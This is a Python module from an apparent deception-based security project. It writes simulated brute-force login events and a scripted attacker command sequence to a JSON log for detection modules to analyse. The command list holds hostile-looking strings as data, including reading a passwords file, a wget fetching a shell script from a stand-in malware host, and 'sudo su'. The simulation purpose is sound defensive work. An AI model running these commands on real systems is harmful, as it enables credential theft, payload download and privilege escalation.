# =============================================================================
# attack_simulator.py
# Sentinel-JIT — Autonomous Just-In-Time Deception Security System
# =============================================================================
#
# PURPOSE:
#   This module simulates suspicious system activity that could represent
#   an attacker interacting with a target system.
#
#   IMPORTANT: This module does NOT make any security decisions.
#              It does NOT trigger decoy environments or block attackers.
#              It ONLY generates raw security events (login attempts,
#              suspicious signals, attacker commands) and saves them to
#              logs.json.
#
#   Other modules will read these logs and decide how to respond:
#       risk_engine.py  → calculates risk score and decides on decoy
#       ai_analysis.py  → classifies attacker behavior into attack stages
#       app.py          → displays everything on a dashboard
#
# RUN WITH:
#   python attack_simulator.py
#
# =============================================================================

import json
import os
import random
from datetime import datetime, timedelta

# ---------------------------------------------------------------------------
# CONSTANTS
# ---------------------------------------------------------------------------

# Fixed IP address representing the simulated attacker.
ATTACKER_IP = "192.168.1.45"

# Path to the shared log file used by all Sentinel-JIT modules.
LOG_FILE = "logs.json"


# ---------------------------------------------------------------------------
# FUNCTION 1: generate_login_attempts
# ---------------------------------------------------------------------------
def generate_login_attempts():
    """
    Simulates repeated login attempts from a suspicious IP address.

    This function models a brute-force scenario where an attacker tries
    several username/password combinations before finally getting through.

    NOTE: This function only generates events. It does NOT decide whether
          the system should respond or trigger a decoy.

    Returns:
        list[dict]: A list of login attempt event dictionaries.
    """

    # We'll generate 6 login attempts.
    # The first 5 will be marked as "failed" (wrong password guesses).
    # The 6th attempt is marked as "success" — simulating the attacker
    # gaining access. (In reality this would land them in the decoy.)

    events = []

    # Use the current real time as the starting point for the event timeline.
    current_time = datetime.now()

    # Generate 5 failed login attempts.
    for i in range(5):
        # Space each attempt ~15 seconds apart to mimic an automated tool.
        attempt_time = current_time + timedelta(seconds=i * 15)

        event = {
            "type":      "login_attempt",    # identifies the kind of event
            "ip":        ATTACKER_IP,        # source of the suspicious activity  # noqa: E501
            "status":    "failed",           # this attempt did not succeed
            "timestamp": attempt_time.isoformat()   # ISO format: YYYY-MM-DDTHH:MM:SS  # noqa: E501
        }

        events.append(event)

    # Generate the final "successful" login attempt (entry into the decoy).
    final_time = current_time + timedelta(seconds=5 * 15)   # 75 seconds after start  # noqa: E501

    events.append({
        "type":      "login_attempt",
        "ip":        ATTACKER_IP,
        "status":    "success",             # attacker gets in (to the decoy)
        "timestamp": final_time.isoformat()
    })

    return events


# ---------------------------------------------------------------------------
# FUNCTION 2: generate_attacker_commands
# ---------------------------------------------------------------------------
def generate_attacker_commands():
    """
    Simulates commands that an attacker might run after gaining access
    to a system (in our case, the simulated decoy environment).

    The commands follow a realistic attack sequence:
      - First, the attacker gathers basic information about the system
        (Reconnaissance).
      - Then, they explore files and directories (Discovery).
      - Finally, they try to download malicious tools and escalate
        privileges (Exfiltration / Privilege Escalation).

    NOTE: This function only generates raw command events. It does NOT
          classify commands into attack stages — that is ai_analysis.py's job.

    Returns:
        list[dict]: A list of attacker command event dictionaries.
    """

    # A realistic sequence of shell commands an attacker might run.
    attacker_commands = [
        "whoami",                                       # Who is the current user?  # noqa: E501
        "id",                                           # What groups/privileges do I have?  # noqa: E501
        "uname -a",                                     # What OS and kernel is running?  # noqa: E501
        "ls",                                           # List files in the current directory.  # noqa: E501
        "cd /home",                                     # Navigate to home directories.  # noqa: E501
        "cat passwords.txt",                            # Try to read a sensitive file.  # noqa: E501
        "wget http://malware.example.com/malware.sh",   # Download a malicious payload.  # noqa: E501
        "sudo su",                                      # Attempt to become root (superuser).  # noqa: E501
    ]

    events = []

    # Commands start 90 seconds after the base time (after the last login attempt).  # noqa: E501
    command_start_time = datetime.now() + timedelta(seconds=90)

    for index, command in enumerate(attacker_commands):
        # Add a small random delay between commands (5–15 seconds)
        # to make the timeline look more natural.
        delay = timedelta(seconds=index * random.randint(5, 15))
        command_time = command_start_time + delay

        event = {
            "type":      "attacker_command",    # identifies this as a command event  # noqa: E501
            "ip":        ATTACKER_IP,           # attacker IP (same as login attempts)  # noqa: E501
            "command":   command,               # the shell command that was run  # noqa: E501
            "timestamp": command_time.isoformat()
        }

        events.append(event)

    return events


# ---------------------------------------------------------------------------
# FUNCTION 3: save_logs
# ---------------------------------------------------------------------------
def save_logs(events):
    """
    Saves a list of event dictionaries to logs.json.

    If logs.json already has content from a previous run, the new events
    are appended to preserve the full history.

    logs.json always stays valid JSON (a list of event dicts).

    Args:
        events (list[dict]): The new events to save.
    """

    # Step 1: Load whatever is already in logs.json (could be from a past run).
    existing_events = []

    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            content = f.read().strip()
            # Only parse if the file actually has content (avoid JSON parse error on empty file).  # noqa: E501
            if content:
                existing_events = json.loads(content)

    # Step 2: Add the new events after the existing ones.
    all_events = existing_events + events

    # Step 3: Write the full list back to logs.json.
    # indent=4 makes the file readable by humans.
    with open(LOG_FILE, "w") as f:
        json.dump(all_events, f, indent=4)


# ---------------------------------------------------------------------------
# FUNCTION 4: main
# ---------------------------------------------------------------------------
def main():
    """
    Runs the full attack simulation from start to finish.

    Steps:
      1. Generate login attempt events.
      2. Generate attacker command events.
      3. Combine all events into one list.
      4. Save everything to logs.json.
      5. Print a confirmation message.
    """

    print()
    print("Attack Simulator  —  generating security events")
    print()

    # Step 1: Generate login attempts.
    print("  Generating login attempts...")
    login_events = generate_login_attempts()
    print(f"    {len(login_events)} login events created.")

    # Step 2: Generate attacker commands.
    print("  Generating attacker commands...")
    command_events = generate_attacker_commands()
    print(f"    {len(command_events)} command events created.")

    # Step 3: Merge both lists into a single chronological event list.
    all_events = login_events + command_events

    # Step 4: Write to logs.json.
    print(f"  Saving {len(all_events)} events to {LOG_FILE}...")
    save_logs(all_events)

    # Step 5: Confirm success.
    print()
    print(f"  Done. {len(all_events)} events written to {LOG_FILE}.")
    print()


# ---------------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------------
# This block runs only when you execute this file directly:
#   python attack_simulator.py
# It does NOT run when this file is imported by another module.
if __name__ == "__main__":
    main()
